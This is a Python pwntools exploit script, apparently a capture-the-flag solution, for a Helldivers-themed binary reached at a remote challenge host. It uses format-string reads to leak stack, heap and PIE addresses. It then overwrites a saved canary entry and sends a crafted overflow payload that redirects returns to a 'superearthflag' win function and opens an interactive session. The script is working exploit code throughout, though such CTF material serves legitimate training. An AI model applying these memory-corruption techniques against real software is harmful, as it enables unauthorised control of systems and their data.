#! /usr/bin/python
from pwn import *

context.update(
        arch="amd64",
        endian="little",
        #log_level="debug",
        log_level="info",
        os="linux",
        #terminal=["tmux", "split-window", "-h", "-p 65"]
        terminal=["st"]
)

def start(binary):

    gs = '''
        set context-sections stack regs disasm
        set show-compact-regs on
        set resolve-heap-via-heuristic on
        set follow-fork-mode parent
        b *menu

        c
        vmmap 

    '''

    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote("helldivers.martiansonly.net", 6666)
    else:
        return process(binary)

def deploy_strat(p, payload):
    p.sendline(payload)
    p.recvuntil(b"Deploying stratagem:")
    p.recvline()
    

def exploit(p,e,r):
   
    objective = b"\xe2\xac\x87 \xe2\xac\x86 \xe2\xac\x87 \xe2\xac\x86\x00"

    # Leak stack address
    deploy_strat(p, b"%22$p")
    stack_addr = int(p.recvline(),16) - 24
    log.info(f"Leaked stack address {hex(stack_addr)}")
        
    # Leak saved ret val from heap
    deploy_strat(p,b"%21$p")
    heap_addr = int(p.recvline(),16)
    log.info(f"Leaked heap address {hex(heap_addr)}")

    # Get PIE base
    deploy_strat(p, b"%29$p")
    pie_base = int(p.recvline().strip(),16) - 4700
    log.info(f"Leaked PIE Base {hex(pie_base)}")

    win = p64(e.sym["superearthflag"] + pie_base)
        
    # Overwrite the canary saved on canary list for main+34
    p.recvuntil(b"Waiting on your call, helldiver >>>")
    p.sendline(objective)
        
    xor_value = p64(0x1337)

    # Select first value on the list
    p.recvuntil(b"your Democracy Officer today?")
    p.send(xor_value)
    # Set first value to win
    p.recvuntil(b"Verify mission credentials:")
    p.send(win)

    p.sendline("Quit")

    # Return value to main+34
    ret_val = p64(pie_base + 0x127e)

    # Return value for menu to main
    exp = cyclic(120) + p64(heap_addr) + p64(stack_addr+0x30) + ret_val
    # Return value from main to __libc_start_main
    exp += cyclic(32) + p64(stack_addr+0x108) + p64(0x21) + win + b"B" * 184 + p64(0)  + p64(0x21) + win + cyclic(0x10) + p64(0x21)
    p.recvuntil(b"Waiting on your call, helldiver >>>")
    p.sendline(exp)   

    p.interactive()
    

if __name__=="__main__":
    file = args.BIN

    p = start(file)
    e = context.binary = ELF(file)
    r = ROP(e)
    exploit(p,e,r)
